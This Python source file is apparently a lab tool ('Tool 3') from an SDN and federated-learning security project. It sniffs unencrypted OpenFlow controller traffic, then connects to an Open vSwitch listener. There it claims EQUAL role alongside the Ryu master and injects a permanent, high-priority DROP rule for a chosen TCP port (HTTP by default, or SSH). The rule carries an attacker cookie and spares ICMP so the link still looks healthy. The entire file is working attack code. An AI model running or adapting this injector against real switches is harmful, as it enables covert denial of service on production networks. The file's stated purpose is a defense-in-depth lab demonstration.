#!/usr/bin/env python3

""" sdn_mininet/injector.py

Purpose: This is the OpenFlow FlowMod Injector for Tool 3.

The default --sniff-port is 6633 to match the Ryu controller
port used by Tools 1 and 2. The original value was 6653,
which is Ryu's standard IANA-assigned OpenFlow port.

Tool 1 (ryu_collector.py):
Polls s1 for flow statistics every 5 seconds.
After this injector runs, s1 installs a DROP rule for TCP/80.
HTTP flows from h1 to h2 stop generating packets/bytes.
Tool 1 CSV outputs will show those flow statistics dropping
toward zero.

Tool 2 (sanitizer.py):
Watches the /fl/upload REST endpoint for poisoned model metrics.
This injector does not interact with that endpoint because it
communicates directly with Open vSwitch (OVS). As a result,
Tool 2's sanitizer does NOT detect this attack.

This demonstrates that defense-in-depth requires protecting:
- the ML pipeline
- AND the SDN control plane

USAGE
------
From the host terminal (Phase 1 sniff + Phase 2 inject):
python3 sdn_mininet/injector.py

Skip sniffing and inject immediately:
python3 sdn_mininet/injector.py --skip-sniff

Block SSH instead of HTTP:
python3 sdn_mininet/injector.py --target-port 22 --skip-sniff

topology.py --inject automatically launches this script from h7
using --skip-sniff.
"""

from __future__ import annotations

import argparse
import logging
import socket
import struct
import sys
import threading
import time

# Suppress Scapy IPv6 routing warnings commonly seen in lab VMs
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.all import IP, Raw, TCP, sniff  # noqa: E402


# *** Constants ***
# OpenFlow protocol version 1.3
OFP_VERSION = 0x04

# Core OpenFlow message types
OFPT_HELLO = 0
OFPT_ERROR = 1
OFPT_ECHO_REQUEST = 2
OFPT_ECHO_REPLY = 3
OFPT_FEATURES_REQUEST = 5
OFPT_FEATURES_REPLY = 6
OFPT_PACKET_IN = 10
OFPT_FLOW_MOD = 14
# FlowMod command: add a new flow entry
OFPFC_ADD = 0
# Match structure type: OXM (OpenFlow Extensible Match)
OFPMT_OXM = 1
# OpenFlow Basic Match Class
OFPXMC_OPENFLOW_BASIC = 0x8000
# OpenFlow match fields used to identify packets we want to block.
# These fields allow the switch to match:
# - Ethernet type = IPv4
# - IP protocol = TCP
# - TCP destination port = target_port
OXM_FIELD_ETH_TYPE = 5
OXM_FIELD_IP_PROTO = 10
OXM_FIELD_TCP_DST = 14
# Wildcard constants used by FlowMod messages
OFPP_ANY = 0xFFFFFFFF
OFPG_ANY = 0xFFFFFFFF
OFP_NO_BUFFER = 0xFFFFFFFF
# Attacker cookie visible in ovs-ofctl dump-flows output.
# This helps identify the malicious rule after installation.
ATTACKER_COOKIE = 0xDEADBEEFCAFE0001
# Controller roles (OpenFlow 1.3)
OFPT_ROLE_REQUEST = 24
OFPT_ROLE_REPLY   = 25
OFPCR_ROLE_EQUAL  = 1  # full access, no mastership
OFPCR_ROLE_MASTER = 2  # full access, demotes other masters

RED = "\033[91m"
YELLOW = "\033[93m"
WHITE = "\033[97m"
RESET = "\033[0m"


# Human-readable names for common OpenFlow message types
_TYPE_NAMES: dict[int, str] = {
    0: "HELLO",
    1: "ERROR",
    2: "ECHO_REQUEST",
    3: "ECHO_REPLY",
    5: "FEATURES_REQUEST",
    6: "FEATURES_REPLY",
    10: "PACKET_IN",
    12: "PORT_STATUS",
    13: "PACKET_OUT",
    14: "FLOW_MOD",
    19: "MULTIPART_REQUEST",
    20: "MULTIPART_REPLY",
}



# *** OpenFlow Packet Builders ***

# Build a standard 8-byte OpenFlow message header.
# Every OpenFlow message begins with:
# version | type | length | transaction ID (xid)
def _ofp_header(msg_type: int, body: bytes, xid: int = 1) -> bytes:
    return struct.pack(
        "!BBHI",
        OFP_VERSION,
        msg_type,
        8 + len(body),
        xid
    ) + body


# Build an OFPT_HELLO message used during the initial.
# OpenFlow handshake between controller and switch.
def build_hello() -> bytes:
    return _ofp_header(OFPT_HELLO, b"", xid=1)


# Build a FEATURES_REQUEST message.
# This asks the switch to identify itself and provide capabilities.
def build_features_request() -> bytes:
    return _ofp_header(OFPT_FEATURES_REQUEST, b"", xid=2)


# Encode one OXM match field (Type-Length-Value format).
# Wire format: class(2) | field+mask(1) | length(1) | value(n)
def _oxm_tlv(field_id: int, value: bytes) -> bytes:

    return (
        struct.pack(
            "!HBB",
            OFPXMC_OPENFLOW_BASIC,
            (field_id << 1) | 0,
            len(value)
        )
        + value
    )


""" Build the packet-matching portion of the FlowMod.
This tells the switch to match:
- IPv4 packets
- using TCP
- whose destination port equals target_port

Example:
target_port=80 -> block HTTP traffic

The final structure is padded to an 8-byte boundary,
which is required by OpenFlow 1.3. """
def _build_oxm_match(target_port: int) -> bytes:

    oxm_fields = (
        _oxm_tlv(
            OXM_FIELD_ETH_TYPE,
            struct.pack("!H", 0x0800)      # IPv4
        )
        + _oxm_tlv(
            OXM_FIELD_IP_PROTO,
            struct.pack("!B", 6)           # TCP
        )
        + _oxm_tlv(
            OXM_FIELD_TCP_DST,
            struct.pack("!H", target_port)
        )
    )

    # Match header length before alignment padding
    match_len = 4 + len(oxm_fields)

    raw = struct.pack("!HH", OFPMT_OXM, match_len) + oxm_fields

    # Pad structure to a multiple of 8 bytes
    return raw + b"\x00" * ((8 - len(raw) % 8) % 8)


""" Build a malicious OpenFlow FlowMod message
This FlowMod installs a high-priority DROP rule into the switch. 
Any packets matching the rule are silently discarded. 

In OpenFlow 1.3, a FlowMod normally contains: 
1. A fixed-length header/body section 
2. Match fields (what traffic to match) 
3. Instructions/actions (what to do with matching traffic) 
 
This attack intentionally omits forwarding actions. 
When no actions are provided, Open vSwitch drops the packet. 
 
*** OFPT_FLOW_MOD Fixed Body Layout ***
cookie(8): Unique identifier for the flow rule 
cookie_mask(8): Mask used for cookie matching 
table_id(1): Flow table where the rule is installed 
command(1): Operation type (ADD / MODIFY / DELETE) 
idle_timeout(2): Remove flow after inactivity timeout 
hard_timeout(2): Remove flow after absolute timeout 
priority(2): Rule priority 
buffer_id(4): Buffered packet reference 
out_port(4): Restrict matching output port 
out_group(4): Restrict matching output group 
flags(2): Additional FlowMod options 
pad(2): Alignment padding required by OF 1.3 

 *** struct.pack() Format Explanation *** 
# Q = uint64 (8 bytes) 
# B = uint8 (1 byte) 
# H = uint16 (2 bytes) 
# I = uint32 (4 bytes) 
# xx = 2 bytes of padding 

Format string: 
"!QQBBHHHIIIHxx" 

"!" means: 
Use network byte order (big-endian), which is required by OpenFlow. 
 
This packed binary structure becomes the fixed body 
of the malicious FlowMod message sent to the switch.
"""
def build_drop_flowmod(target_port: int, priority: int) -> bytes:

    fixed = struct.pack(
        "!QQBBHHHIIIHxx",

        ATTACKER_COOKIE, # cookie
        0,  # cookie_mask
        0,  # table_id
        OFPFC_ADD,  # command
        0,  # idle_timeout
        0,  # hard_timeout
        priority,  # rule priority
        OFP_NO_BUFFER,  # buffer_id
        OFPP_ANY,  # out_port
        OFPG_ANY,  # out_group
        0,  # flags
    )

    return _ofp_header(
        OFPT_FLOW_MOD,
        fixed + _build_oxm_match(target_port),
        xid=3
    )


"""
Request EQUAL role so OVS allows us to install FlowMods
even while Ryu holds MASTER role on the same switch.
Body: role(4) + pad(4) + generation_id(8) = 16 bytes
"""
def build_role_request() -> bytes:
    body = struct.pack("!IIQ",
        OFPCR_ROLE_EQUAL,  # role
        0,  # pad
        0,  # generation_id (ignored for EQUAL)
    )
    return _ofp_header(OFPT_ROLE_REQUEST, body, xid=4)


# *** Phase 1 — Passive Control Channel Sniffer ***

"""
Passively monitors OpenFlow traffic on the loopback interface.

This demonstrates that an attacker with local access can observe
unencrypted SDN controller traffic in real time.

When the first valid OpenFlow message is detected,
Phase 2 (the injector) is triggered automatically.
"""
class ControlChannelSniffer:

    """Initialize the passive OpenFlow sniffer. 
    Parameters: 
    - iface: Network interface to monitor 
    - sniff_port: Controller TCP port to watch for OF traffic 
    - on_detect: Callback function executed after traffic is detected """
    def __init__(self, iface: str, sniff_port: int, on_detect):
        self.iface = iface
        self.sniff_port = sniff_port
        # Callback function executed once traffic is detected
        self._callback = on_detect
        # Prevent multiple injections from triggering
        self._fired = threading.Event()
        # Signal used to stop Scapy sniffing
        self._stop = threading.Event()

    # Process each sniffed packet and check whether it contains 
    # OpenFlow control traffic on the monitored controller port.
    def _handle(self, pkt):
        if self._fired.is_set():
            return
        # Ignore packets that are not TCP with payload data
        if not (pkt.haslayer(TCP) and pkt.haslayer(Raw)):
            return

        sp, dp = pkt[TCP].sport, pkt[TCP].dport

        # Ignore unrelated TCP traffic
        if self.sniff_port not in (sp, dp):
            return

        payload = bytes(pkt[Raw].load)

        # OpenFlow headers are always 8 bytes minimum
        if len(payload) < 8:
            return

        # Parse the standard OpenFlow message header
        version, msg_type, length, xid = struct.unpack(
            "!BBHI",
            payload[:8]
        )

        # Ignore non-OpenFlow 1.3 traffic
        if version != OFP_VERSION:
            return

        direction = "-> Ctrl" if dp == self.sniff_port else "<- Ctrl"

        name = _TYPE_NAMES.get(msg_type, f"type={msg_type}")

        src = pkt[IP].src if pkt.haslayer(IP) else "?"
        dst = pkt[IP].dst if pkt.haslayer(IP) else "?"

        print(
            f"  [SNIFF]  {direction:<8}  "
            f"OF v1.3  {name:<20}  "
            f"len={length:>5}  xid={xid}  "
            f"({src}:{sp}→{dst}:{dp})"
        )

        # Once valid OpenFlow traffic is observed,
        # launch the injection phase in a background thread.
        if not self._fired.is_set():

            self._fired.set()

            print(
                "\n[*] Control channel confirmed — traffic is unencrypted.\n"
                "[*] Triggering Phase 2 ...\n"
            )

            threading.Thread(
                target=self._callback,
                daemon=True
            ).start()
    """Start passive packet sniffing on the selected interface. 
    Scapy listens for TCP traffic on the configured controller 
    port and forwards matching packets to self._handle(). 
     
    The sniffer automatically stops when: 
    - the timeout expires, or 
    - self._stop is triggered  """
    def start(self, timeout: int) -> None:
        print(
            f"[*] Phase 1 — sniffing port {self.sniff_port} "
            f"on '{self.iface}' (timeout={timeout}s) ...\n"
        )

        sniff(
            # Network interface to monitor
            iface=self.iface,
            # Capture only TCP traffic for the controller port
            filter=f"tcp port {self.sniff_port}",
            # Callback function executed for each captured packet
            prn=self._handle,
            # Do not store packets in memory
            store=False,
            # Maximum sniffing duration in seconds
            timeout=timeout,
            # Stop sniffing if the stop event becomes set
            stop_filter=lambda _: self._stop.is_set(),
        )

    # Stop the packet sniffer by setting the internal stop event. 
    # This will cause the Scapy sniff loop to terminate.
    def stop(self):
        self._stop.set()
    
    # Indicates whether the sniffer has already detected 
    # OpenFlow control traffic and triggered the injection phase.
    @property
    def triggered(self) -> bool:
        return self._fired.is_set()


# *** Phase 2 — FlowMod Injectr ***

# Read one complete OpenFlow message from the socket.
#
# OpenFlow messages begin with an 8 byte header containing
# the total message length. After reading the header,
# the remaining message body is read separately.
def _recv_msg(sock: socket.socket, timeout: float = 5.0) -> bytes:
    sock.settimeout(timeout)
    hdr = b""
    while len(hdr) < 8:
        chunk = sock.recv(8 - len(hdr))
        if not chunk:
            raise ConnectionError("Socket closed reading OF header")
        hdr += chunk
    _, _, total_len, _ = struct.unpack("!BBHI", hdr)
    body = b""
    remaining = total_len - 8

    while len(body) < remaining:
        chunk = sock.recv(remaining - len(body))
        if not chunk:
            raise ConnectionError("Socket closed reading OF body")
        body += chunk

    return hdr + body


# Continuously read OpenFlow messages until:
# - the expected message type arrives
# - an OFPT_ERROR is received
# - max_msgs messages have been processed
def _read_until(
    sock: socket.socket,
    want_type: int,
    timeout: float = 5.0,
    max_msgs: int = 5
) -> bytes | None:
    for _ in range(max_msgs):
        msg = _recv_msg(sock, timeout)

        _, msg_type, _, _ = struct.unpack("!BBHI", msg[:8])

        print(f"  [RECV]   {_TYPE_NAMES.get(msg_type, f'type={msg_type}')}")

        if msg_type == want_type:
            return msg
        if msg_type == OFPT_ERROR:
            print("[!] Switch returned OFPT_ERROR — aborting.")
            return None
    return None


# Connect to Open vSwitch (OVS), perform the OpenFlow handshake,
# and inject a malicious FlowMod.
def inject_flowmod(
    switch_ip: str,
    switch_port: int,
    target_port: int,
    priority: int
) -> bool:

    print(f"[*] Phase 2: connecting to OVS at {switch_ip}:{switch_port}")

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((switch_ip, switch_port))
    except ConnectionRefusedError:
        print(
            "[!] Connection refused.\n"
            "[!] Is topology.py running with ptcp:6654 enabled on s1?\n"
            "[!] Make sure:\n"
            "[!] ovs-vsctl set-controller s1 ... ptcp:6654"
        )
        return False
    print("[+] TCP connection established.")

    
    # Step 1: OpenFlow HELLO handshake
    sock.sendall(build_hello())
    print("  [SEND]   HELLO")

    if _read_until(sock, OFPT_HELLO) is None:
        sock.close()
        return False


    # Step 2: Request switch features and Datapath ID (DPID)
    sock.sendall(build_features_request())
    print("  [SEND]   FEATURES_REQUEST")
    reply = _read_until(sock, OFPT_FEATURES_REPLY)

    if reply is None:
        sock.close()
        return False

    # Datapath ID uniquely identifies the OpenFlow switch
    if len(reply) >= 16:
        dpid = struct.unpack("!Q", reply[8:16])[0]
        print(f"[+] Datapath ID: 0x{dpid:016x}")
        
    # Request EQUAL role — required when Ryu already holds MASTER
    sock.sendall(build_role_request())
    print("  [SEND]   ROLE_REQUEST (EQUAL)")
    _read_until(sock, OFPT_ROLE_REPLY)

    # Step 3: Send the FlowMod -> inject malicious FlowMod
    sock.sendall(build_drop_flowmod(target_port, priority))
    	
    
    print()
    print("                FLOWMOD INJECTED (Tool 3)               ")
    print("--------------------------------------------------------")
    print(f"Match: IPv4/TCP/tcp_dst={target_port:<24}")
    print("Action: DROP (no instructions -> implicit discard)")
    print(f"Priority: {priority:<42}")
    print("Timeouts: 0/0 (permanent)")
    print(f"Cookie: 0x{ATTACKER_COOKIE:016x}")
    print("--------------------------------------------------------")
    print()
    print("[*] What each tool sees now:")
    print(
        "[*] Tool 1 (Isolation Forest): "
        "live_client1.csv TCP/80 flows -> 0 bytes"
    )
    print(
        "[*] Tool 2 (Sanitizer): "
        "unaffected — no /fl/upload call made"
    )
    print(
        "[*] Tool 3 (this script): "
        "FlowMod installed on s1"
    )
    print()
    print(f"{RED}[!]{YELLOW} -----------> {WHITE}Verify with:{RESET}")
    print(f"{YELLOW}[->]{RESET} sudo ovs-ofctl dump-flows s1 -O OpenFlow13")

    print(
        f"{YELLOW}[->]{RESET} Look for: cookie=0x{ATTACKER_COOKIE:x}, "
        f"priority={priority}, "
        f"tcp,tp_dst={target_port} actions=drop"
    )
    time.sleep(0.5)
    sock.close()
    return True



# *** CLI ***

_BANNER = r"""
____________________ SDN-FL TOOL 3 ____________________
[*] OpenFlow FlowMod Injector  ·  Tool 3
[*] Phase 1: Sniff the unencrypted control channel
[*] Phase 2: Inject a DROP rule for TCP/{port}
[*] Evasion: ICMP (ping) is never matched -> link looks healthy
"""


def _parse_args() -> argparse.Namespace:
    # Create the main command-line parser
    p = argparse.ArgumentParser(
        prog="injector.py",
        description="Tool 3: OpenFlow v1.3 surgical FlowMod injection"
    )
    
    # IP address of the Open vSwitch passive TCP listener. 
    # In this lab, OVS runs locally on the host machine.    
    p.add_argument(
        "--switch-ip",
        default="127.0.0.1",
        help="OVS passive listener IP [default: 127.0.0.1]"
    )

    # TCP port where Open vSwitch accepts OpenFlow connections. 
    # topology.py configures s1 with ptcp:6654.
    p.add_argument(
        "--switch-port",
        type=int,
        default=6654,
        help="OVS passive listener port [default: 6654]"
    )

    # TCP destination port to block with the malicious FlowMod. 
    # Example: 80 = HTTP & 22 = SSH
    p.add_argument(
        "--target-port",
        type=int,
        default=80,
        help="TCP destination port to block [default: 80]"
    )
    # Flow rule priority installed into the switch. 
    # Higher values override normal controller-installed rules.
    p.add_argument(
        "--priority",
        type=int,
        default=40000,
        help="FlowMod priority [default: 40000]"
    )

    # Network interface used for passive OpenFlow sniffing. 
    # 'lo' is the Linux loopback interface.
    p.add_argument(
        "--iface",
        default="lo",
        help="Interface for Phase 1 sniffing [default: lo]"
    )
    # OpenFlow controller port to monitor during Phase 1. 
    # Port 6633 matches the Ryu controller used by Tools 1 and 2.
    p.add_argument(
        "--sniff-port",
        type=int,
        default=6633,
        help="Controller port to sniff [default: 6633]"
    )

    # Maximum amount of time to wait for controller traffic 
    # before reporting failure.
    p.add_argument(
        "--sniff-timeout",
        type=int,
        default=30,
        help="Seconds to wait for OpenFlow traffic [default: 30]"
    )
    
    # Skip passive sniffing and immediately inject the FlowMod. 
    # Useful after the topology is already stable.
    p.add_argument(
        "--skip-sniff",
        action="store_true",
        help="Skip Phase 1 and inject immediately"
    )

    return p.parse_args()


def main() -> None:
    args = _parse_args()
    print(_BANNER.replace("{port}", str(args.target_port)))

    # Event used to signal when injection finishes
    inject_done = threading.Event()

    # Wrapper function that launches the FlowMod injection phase. 
    # This is used as the callback for the passive sniffer.
    def _do_inject():
        # Connect to Open vSwitch and install the malicious 
        # Drop rule targeting the selected TCP destination port.
        inject_flowmod(
            switch_ip=args.switch_ip,
            switch_port=args.switch_port,
            target_port=args.target_port,
            priority=args.priority,
        )
        # Signal that the injection phase has completed.
        inject_done.set()

    # Skip passive sniffing and inject immediately
    if args.skip_sniff:

        print("[*] --skip-sniff: bypassing Phase 1.\n")
        _do_inject()
    else:
        sniffer = ControlChannelSniffer(
            iface=args.iface,
            sniff_port=args.sniff_port,
            on_detect=_do_inject,
        )

        try:
            sniffer.start(timeout=args.sniff_timeout)
        except KeyboardInterrupt:
            sniffer.stop()
            print("\n[!] Interrupted.")
            sys.exit(0)
        inject_done.wait(timeout=10)

        # No controller traffic was detected
        if not sniffer.triggered:
            print(
                f"[!] No OpenFlow traffic on port "
                f"{args.sniff_port} within "
                f"{args.sniff_timeout}s.\n"
                "[!] Is ryu_collector.py running?\n"
                "[!] Try --skip-sniff."
            )
            sys.exit(1)
    print("[*] Done.")


if __name__ == "__main__":
    main()
